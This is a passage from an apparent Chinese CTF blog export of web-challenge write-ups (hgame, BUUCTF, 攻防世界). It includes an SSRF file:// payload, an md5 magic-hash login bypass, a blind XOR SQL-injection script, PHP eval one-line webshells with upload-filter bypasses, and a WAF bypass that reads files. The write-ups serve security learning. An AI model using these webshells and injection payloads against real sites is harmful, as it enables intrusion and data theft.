class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($admin_password == md5($_POST[<span class="string">'password'</span>]) &amp;&amp; $_POST[<span class="string">'username'</span>] === $admin_username)&#123;</span><br><span class="line">            $_SESSION[<span class="string">'username'</span>] = $_POST[<span class="string">'username'</span>];</span><br><span class="line">            header(<span class="string">"Location: admin.php"</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"用户名或密码错误"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"zh-CN"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"X-UA-Compatible"</span> content=<span class="string">"IE=edge"</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">"viewport"</span> content=<span class="string">"width=device-width, initial-scale=1"</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">"description"</span> content=<span class="string">""</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">"author"</span> content=<span class="string">""</span>&gt;</span><br><span class="line">    &lt;title&gt;Cosmos的博客后台&lt;/title&gt;</span><br><span class="line">    &lt;link href=<span class="string">"static/signin.css"</span> rel=<span class="string">"stylesheet"</span>&gt;</span><br><span class="line">    &lt;link href=<span class="string">"static/sticky-footer.css"</span> rel=<span class="string">"stylesheet"</span>&gt;</span><br><span class="line">    &lt;link href=<span class="string">"https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css"</span> rel=<span class="string">"stylesheet"</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class="container"&gt;</span><br><span class="line">    &lt;form class="form-signin" method="post" action="login.php"&gt;</span><br><span class="line">        &lt;h2 class="form-signin-heading"&gt;后台登陆&lt;/h2&gt;</span><br><span class="line">        &lt;input type="text" name="username" class="form-control" placeholder="用户名" required autofocus&gt;</span><br><span class="line">        &lt;input type="password" name="password" class="form-control" placeholder="密码" required&gt;</span><br><span class="line">        &lt;input class="btn btn-lg btn-primary btn-block" type="submit" value="Submit"&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;footer class="footer"&gt;</span><br><span class="line">	&lt;center&gt;</span><br><span class="line">	&lt;div class="container"&gt;</span><br><span class="line">        &lt;p class="text-muted"&gt;Created by Annevi&lt;/p&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">      &lt;/center&gt;</span><br><span class="line">&lt;/footer&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>关键代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Only for debug</span></span><br><span class="line"><span class="keyword">if</span> (DEBUG_MODE)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'debug'</span>])) &#123;</span><br><span class="line">        $debug = $_GET[<span class="string">'debug'</span>];</span><br><span class="line">        <span class="keyword">if</span> (!preg_match(<span class="string">"/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/"</span>, $debug)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"args error!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">"var_dump($$debug);"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>构造payload：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">http://cosmos-<span class="keyword">admin</span>.hgame.day-day.<span class="keyword">work</span>/<span class="keyword">login</span>.php?<span class="keyword">debug</span>=GLOBALS</span><br></pre></td></tr></table></figure>
<p>使用GLOBALS显示全局变量<br>得到账号：Cosmos!<br>密码由于采用了!== 又是md5 而且是0exxxxx格式  所以利用PHP中md5的漏洞<br><a href="https://blog.csdn.net/qq_19980431/article/details/83018232" target="_blank" rel="noopener">https://blog.csdn.net/qq_19980431/article/details/83018232</a></p>
<p>随便用一个：QNKCDZO<br>成功登录到后台之后</p>
<p>再利用伪协议读取一下admin.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insert_img</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'img_url'</span>])) &#123;</span><br><span class="line">        $img_url = @$_POST[<span class="string">'img_url'</span>];</span><br><span class="line">        $url_array = parse_url($img_url);</span><br><span class="line">        <span class="keyword">if</span> (@$url_array[<span class="string">'host'</span>] !== <span class="string">"localhost"</span> &amp;&amp; $url_array[<span class="string">'host'</span>] !== <span class="string">"timgsa.baidu.com"</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;   </span><br><span class="line">        $c = curl_init();</span><br><span class="line">        curl_setopt($c, CURLOPT_URL, $img_url);</span><br><span class="line">        curl_setopt($c, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $res = curl_exec($c);</span><br><span class="line">        curl_close($c);</span><br><span class="line">        $avatar = base64_encode($res);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(filter_var($img_url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">            <span class="keyword">return</span> $avatar;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> base64_encode(file_get_contents(<span class="string">"static/logo.png"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>关键代码 利用SSRF构造payload</p>
<figure class="highlight delphi"><table><tr><td class="code"><pre><span class="line"><span class="keyword">file</span>:<span class="comment">//localhost/flag</span></span><br></pre></td></tr></table></figure>
<p>复制图片的地址 解码后面的base64</p>
<p>得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>hgame-鸡尼泰玫</title>
    <url>/2020/01/26/hgame-%E9%B8%A1%E5%B0%BC%E6%B3%B0%E7%8E%AB/</url>
    <content><![CDATA[<h1 id="鸡尼泰玫"><a href="#鸡尼泰玫" class="headerlink" title="鸡尼泰玫"></a>鸡尼泰玫</h1><p>打开发现又黑我坤坤</p>
<p>发现是个游戏 开始游戏 随便玩玩用bp抓包<br><img src="/images/hgame/%E9%B8%A1%E4%BD%A0%E5%A4%AA%E7%BE%8E/0.png" alt="avatar"></p>
<p>直接改score</p>
<p>得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>hgame-Code World</title>
    <url>/2020/01/26/hgame-Code-World/</url>
    <content><![CDATA[<h1 id="Code-World"><a href="#Code-World" class="headerlink" title="Code World"></a>Code World</h1><p>打开竟然是个403</p>
<p>用bp抓包<br>访问一下index.php<br><img src="/images/hgame/codeworld/0.png" alt="avatar"></p>
<p>发现405错误<br><a href="https://www.jianshu.com/p/dd7315428462" target="_blank" rel="noopener">https://www.jianshu.com/p/dd7315428462</a></p>
<p>所以更改为POST请求<br><img src="/images/hgame/codeworld/1.png" alt="avatar"></p>
<p>提示要求通过URL计算两个数相加为10</p>
<p>所以直接URL：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">/?a=<span class="number">1</span>+<span class="number">9</span></span><br></pre></td></tr></table></figure>
<p>但是由于URL中+会被转译为空格 使用URL编码</p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">/?a=<span class="number">1</span><span class="symbol">%</span><span class="number">2b9</span></span><br></pre></td></tr></table></figure>
<p>![avatar](/images/hgame/code world/2.png)</p>
<p>得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>hgame-接 头 霸 王</title>
    <url>/2020/01/26/hgame-Cosmos-%E7%9A%84%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<h1 id="接-头-霸-王"><a href="#接-头-霸-王" class="headerlink" title="接 头 霸 王"></a>接 头 霸 王</h1><p>打开环境 根据题目的图片提示 应该是改header</p>
<p>bp抓包<br>再根据You need to come from <a href="https://vidar.club/" target="_blank" rel="noopener">https://vidar.club/</a>. </p>
<p>使用Referer</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="string">Referer:</span><span class="string">https:</span><span class="comment">//vidar.club/</span></span><br></pre></td></tr></table></figure>

<p>又要求本地，使用X-Forwarded-For</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br></pre></td></tr></table></figure>
<p>又要求使用Cosmos浏览器，使用User-Agent</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">User</span>-Agent: Cosmos</span><br></pre></td></tr></table></figure>

<p>又要求POST，直接改请求</p>
<p>得到：The flag will be updated after 2077, please wait for it patiently.</p>
<p>这里要用到If-Unmodified-Since<br>可以参考<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-Unmodified-Since" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-Unmodified-Since</a></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">If-Unmodified-Since: Tue, <span class="number">22</span> Oct <span class="number">2077</span> <span class="number">20</span>:<span class="number">49</span>:<span class="number">38</span> GMT</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-Hack World</title>
    <url>/2020/01/25/BUUCTF-Hack-World/</url>
    <content><![CDATA[<h1 id="Hack-World"><a href="#Hack-World" class="headerlink" title="Hack World"></a>Hack World</h1><p>打开环境 题目提示是Php 和 sql注入<br>所以先按常规的SQL来测试一下</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">输入</span><br><span class="line"><span class="number">1</span> 一句骚话</span><br><span class="line"><span class="number">2</span> 一句骚话</span><br><span class="line"><span class="number">1</span>' bool(false)</span><br><span class="line"><span class="number">1</span>'# SQL Injection Checked.</span><br></pre></td></tr></table></figure>
<p>尝试一下：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">联合注入：unin被过滤</span><br><span class="line">报错注入：<span class="keyword">and</span>、<span class="keyword">or</span>、updatexml被过滤</span><br><span class="line"><span class="built_in">bool</span>注入和time注入：<span class="keyword">and</span>、<span class="keyword">or</span>被过滤</span><br><span class="line">可以通过fuzz测试（模糊测试），发现哪些字符被过滤了。length为<span class="number">482</span>的，全都是被过滤的。</span><br></pre></td></tr></table></figure>
<p>这里没啥 思路了 但是通过bool(false)  可以判断应该是布尔盲注把 </p>
<p>看看WP<br>这里考的是异或注入：<br>1^1=0</p>
<p>1^0=1</p>
<p>另外还学到了</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">利用/*!<span class="class"><span class="keyword">union</span>*/可以绕过对<span class="title">union</span>的过滤  但是这题不能用 先存着</span></span><br></pre></td></tr></table></figure>

<p>由于不会写脚本 所以找了个大师傅的二分脚本：</p>
<figure class="highlight nix"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*- </span></span><br><span class="line"><span class="built_in">import</span> requests</span><br><span class="line"><span class="built_in">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="attr">url</span> = <span class="string">"http://a5b5ef4b-d1ce-48aa-a3cf-31243ef82374.node3.buuoj.cn/index.php"</span></span><br><span class="line"><span class="attr">payload</span> = &#123;</span><br><span class="line">    <span class="string">"id"</span> : <span class="string">""</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="attr">result</span> = <span class="string">""</span></span><br><span class="line">for i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="attr">l</span> = <span class="number">33</span></span><br><span class="line">    <span class="attr">r</span> =<span class="number">130</span></span><br><span class="line">    <span class="attr">mid</span> = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">    while(l&lt;r):</span><br><span class="line">        payload[<span class="string">"id"</span>] = <span class="string">"0^"</span> + <span class="string">"(ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;)"</span>.format(i,mid)</span><br><span class="line">        <span class="attr">html</span> = requests.post(url,<span class="attr">data=payload)</span></span><br><span class="line">        print(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Hello"</span> <span class="keyword">in</span> html.text:</span><br><span class="line">            <span class="attr">l</span> = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="attr">r</span> = mid</span><br><span class="line">        <span class="attr">mid</span> = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(chr(mid)==<span class="string">" "</span>):</span><br><span class="line">        break</span><br><span class="line">    <span class="attr">result</span> = result + chr(mid)</span><br><span class="line">    print(result)</span><br><span class="line">print(<span class="string">"flag: "</span> ,result)</span><br></pre></td></tr></table></figure>


<p>得到flag</p>
<p>不会写脚本 好多题都没法做 唉</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-CheckIn</title>
    <url>/2020/01/25/BUUCTF-CheckIn/</url>
    <content><![CDATA[<h1 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h1><p>打开环境看到是一个上传的界面 难道是一句话木马</p>
<p>上传一个一句话木马 抓包 之后更改Type 发现不行 把.php改为.png后 正常通过，看来是验证了后缀名</p>
<p>所以尝试在.php后加一个空格 再.png 成功上传</p>
<p>通过抓包 还发现过滤掉了&lt;?, 所以我们变形为</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">'php'</span>&gt;</span><span class="javascript">@<span class="built_in">eval</span>($_POST[<span class="string">'a'</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里没有什么思路了 去看了一下WP  有两个知识点</p>
<ol>
<li><p>.user.ini文件 <a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a></p>
</li>
<li><p>GIF89a 图片头文件欺骗 <a href="https://blog.csdn.net/piaolankeke/article/details/5872876" target="_blank" rel="noopener">https://blog.csdn.net/piaolankeke/article/details/5872876</a></p>
</li>
</ol>
<p>接下来就是上传了<br><img src="/images/BUUCTF/CheckIn/0.png" alt="avatar"></p>
<p><img src="/images/BUUCTF/CheckIn/1.png" alt="avatar"></p>
<p>接下来用菜刀getshell</p>
<p>得到flag</p>
<p>这里还有一种GET型的一句话木马<br>步骤与之前差不多</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">'php'</span>&gt;</span><span class="javascript">@<span class="built_in">eval</span>($_GET[<span class="string">'a'</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>URL：<br>?a=system(“cat /flag”);</p>
<p>也可以得到flag</p>
<p>题目提供了源码：<br><a href="https://github.com/team-su/SUCTF-2019/tree/master/Web/checkIn" target="_blank" rel="noopener">https://github.com/team-su/SUCTF-2019/tree/master/Web/checkIn</a></p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界-lottery</title>
    <url>/2020/01/21/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-lottery/</url>
    <content><![CDATA[<h1 id="lottery"><a href="#lottery" class="headerlink" title="lottery"></a>lottery</h1><p>打开环境 看了一下题目 大概一下就是玩个游戏 只要你输入的7个数字和系统随机生成的7个数字一样 你就会获得钱  钱够了可以买flag</p>
<p>首先 访问 /robots.txt 或者 /.git/ 发现 Git 仓库可以 GitHack 拿到源码<br>漏洞在 api.php</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">  <span class="symbol">$</span>money = <span class="symbol">$</span>_SESSION[<span class="string">'money'</span>];</span><br><span class="line"><span class="meta"><span class="meta-keyword">$numbers</span> = $req['numbers'];</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$win</span>_numbers = random_win_nums();</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$same</span>_count = 0;</span></span><br><span class="line"><span class="keyword">for</span>(<span class="symbol">$</span>i=<span class="number">0</span>; <span class="symbol">$</span>i&lt;<span class="number">7</span>; <span class="symbol">$</span>i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="symbol">$</span>numbers[<span class="symbol">$</span>i] == <span class="symbol">$</span>win_numbers[<span class="symbol">$</span>i])&#123;</span><br><span class="line">        <span class="symbol">$</span>same_count++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>没什么思路 注册一个账号 随便输入7个数字 抓包<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/lottery/0.png" alt="avatar"></p>
<p>使用 PHP 弱类型松散比较，以”1”为例，和TRUE,1,”1”相等<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/lottery/1.png" alt="avatar"></p>
<p>多发几次包  钱够了 买flag</p>
<p>得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-Easy Calc</title>
    <url>/2020/01/21/BUUCTF-Easy-Calc/</url>
    <content><![CDATA[<h1 id="Easy-Calc"><a href="#Easy-Calc" class="headerlink" title="Easy Calc"></a>Easy Calc</h1><p>打开环境是个计算器，搜索一下Calc是什么</p>
<p>最后发现是CSS中的一个样式，用于进行一下计算<br><a href="http://caibaojian.com/css3-calc.html" target="_blank" rel="noopener">http://caibaojian.com/css3-calc.html</a></p>
<p>尝试一下注入</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">输入</span><br><span class="line"><span class="number">1</span> 正常</span><br><span class="line"><span class="number">1</span>’ 没有报错</span><br><span class="line"><span class="number">1</span><span class="string">'# 直接给PASS了</span></span><br></pre></td></tr></table></figure>
<p>到这里考虑不是SQL注入题</p>
<p>crtl+u看一下源码 看到作者给了提示 写了WAF保障安全</p>
<p>WAF：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">'#calc'</span>).submit(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            url:<span class="string">"calc.php?num="</span>+<span class="built_in">encodeURIComponent</span>($(<span class="string">"#content"</span>).val()),</span><br><span class="line">            type:<span class="string">'GET'</span>,</span><br><span class="line">            success:<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">                $(<span class="string">"#result"</span>).html(<span class="string">`&lt;div class="alert alert-success"&gt;</span></span><br><span class="line"><span class="string">            &lt;strong&gt;答案:&lt;/strong&gt;<span class="subst">$&#123;data&#125;</span></span></span><br><span class="line"><span class="string">            &lt;/div&gt;`</span>);</span><br><span class="line">            &#125;,</span><br><span class="line">            error:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                alert(<span class="string">"这啥?算不来!"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>

<p>$(“#content”).val()是什么意思？  百度一下得知类似于HTML中的document.getElementById(“content”); </p>
<p>再百度一下encodeURIComponent 得知是将参数进行URI编码</p>
<p>再查看一下calc.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $str = $_GET[<span class="string">'num'</span>];</span><br><span class="line">        $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>,<span class="string">'\$'</span>,<span class="string">'\\'</span>,<span class="string">'\^'</span>];</span><br><span class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $str)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">"what are you want to do?"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'echo '</span>.$str.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>根据WAF来进行绕过</p>
<p>接下来构造payload：<br>使用scandir（）返回根目录看一下</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">?num=<span class="number">1</span>;var<span class="constructor">_dump(<span class="params">scandir</span>(<span class="operator">/</span>)</span>);</span><br></pre></td></tr></table></figure>
<p>发现不行 这里没有思路了 看一下WP知道了</p>
<p>PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：1.删除空白符  2.将某些字符转换为下划线（包括空格）【当waf不让你过的时候，php却可以让你过】</p>
<p>所以在num变量前加个空格来让WAF识别不到  并且用char()进行转义</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">? num=<span class="number">1</span>;var<span class="constructor">_dump(<span class="params">scandir</span>(<span class="params">chr</span>(47)</span>))</span><br></pre></td></tr></table></figure>

<p><img src="/images/BUUCTF/Easy_Calc/0.png" alt="avatar"></p>
<p>找到flagg目录</p>
<p>那就继续读取 使用file_get_contents</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">? num=<span class="number">1</span>;var_dump(file_get_contents(chr(<span class="number">47</span>).chr(<span class="number">102</span>).chr(<span class="number">49</span>).chr(<span class="number">97</span>).chr(<span class="number">103</span>).chr(<span class="number">103</span>)))</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界-ics-06</title>
    <url>/2020/01/20/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-ics-06/</url>
    <content><![CDATA[<h1 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a>ics-06</h1><p>进去之后感觉没有什么可以做的地方<br>用御剑扫描一下<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/ics-06/0.png" alt="avatar"></p>
<p>找到一个index.html  访问一下<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/ics-06/1.png" alt="avatar"></p>
<p>送分题？</p>
<p>看了一下URL 有id=1</p>
<p>打开bp 爆破一下 因为是数字 所以用python写一个字典出来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> range (<span class="number">10001</span>):</span><br><span class="line">    print(m)</span><br></pre></td></tr></table></figure>
<p>直接爆破<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/ics-06/2.png" alt="avatar"></p>
<p>id=2333 改一下 然后发包<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/ics-06/3.png" alt="avatar"></p>
<p>得到flag</p>
<p>真·送分题</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-高明的黑客</title>
    <url>/2020/01/20/BUUCTF-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/</url>
    <content><![CDATA[<h1 id="高明的黑客"><a href="#高明的黑客" class="headerlink" title="高明的黑客"></a>高明的黑客</h1><p>打开之后得到一个提示源代码存在了<a href="http://www.tar.gz" target="_blank" rel="noopener">www.tar.gz</a></p>
<p>当时比赛的时候遇到这个题，还一直脑残的以为是某个网站，哭了<br>直接URL访问之后，会下载到源码<br><a href="http://c9d08f8b-8738-4265-a7ec-e5f223c985cf.node3.buuoj.cn/www.tar.gz" target="_blank" rel="noopener">http://c9d08f8b-8738-4265-a7ec-e5f223c985cf.node3.buuoj.cn/www.tar.gz</a></p>
<p>下载好了之后推测是个压缩包之类的，搜一下gz后缀，果然是常见于Linux和MacOS下的压缩包格式，直接7-zip解压</p>
<p>发现有个src的文件，里面有很多杂乱的PHP文件，随便打开一个试试<br>发现读不太懂，但是像$_GET eval echo等还是有的</p>
<p>这里就没有什么思路了，所以看了一下官方WP，找了一个爆破脚本遍历GET并传一些参数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*- </span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> concurrent.futures.thread <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line">path = <span class="string">"D:\phpStudy\phpStudy\PHPTutorial\WWW\src"</span>  <span class="comment"># 文件夹目录</span></span><br><span class="line">files = os.listdir(path)  <span class="comment"># 得到文件夹下的所有文件名称</span></span><br><span class="line"></span><br><span class="line">mutex = threading.Lock()</span><br><span class="line">pool = ThreadPoolExecutor(max_workers=<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_file</span><span class="params">(file)</span>:</span></span><br><span class="line">    print(<span class="string">'finding...'</span>)</span><br><span class="line">    f = open(path + <span class="string">"/"</span> + file);  <span class="comment"># 打开文件</span></span><br><span class="line">    iter_f = iter(f);  <span class="comment"># 创建迭代器</span></span><br><span class="line">    str = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> iter_f:  <span class="comment"># 遍历文件，一行行遍历，读取文本</span></span><br><span class="line">        str = str + line</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取一个页面内所有参数</span></span><br><span class="line">    start = <span class="number">0</span></span><br><span class="line">    params = &#123;&#125;</span><br><span class="line">    <span class="keyword">while</span> str.find(<span class="string">"$_GET['"</span>, start) != <span class="number">-1</span>:</span><br><span class="line">        pos2 = str.find(<span class="string">"']"</span>, str.find(<span class="string">"$_GET['"</span>, start) + <span class="number">1</span>)</span><br><span class="line">        var = str[str.find(<span class="string">"$_GET['"</span>, start) + <span class="number">7</span>: pos2]</span><br><span class="line">        start = pos2 + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        params[var] = <span class="string">'echo("glzjin");'</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(var)</span></span><br><span class="line"></span><br><span class="line">    start = <span class="number">0</span></span><br><span class="line">    data = &#123;&#125;</span><br><span class="line">    <span class="keyword">while</span> str.find(<span class="string">"$_POST['"</span>, start) != <span class="number">-1</span>:</span><br><span class="line">        pos2 = str.find(<span class="string">"']"</span>, str.find(<span class="string">"$_POST['"</span>, start) + <span class="number">1</span>)</span><br><span class="line">        var = str[str.find(<span class="string">"$_POST['"</span>, start) + <span class="number">8</span>: pos2]</span><br><span class="line">        start = pos2 + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        data[var] = <span class="string">'echo("glzjin");'</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(var)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># eval test</span></span><br><span 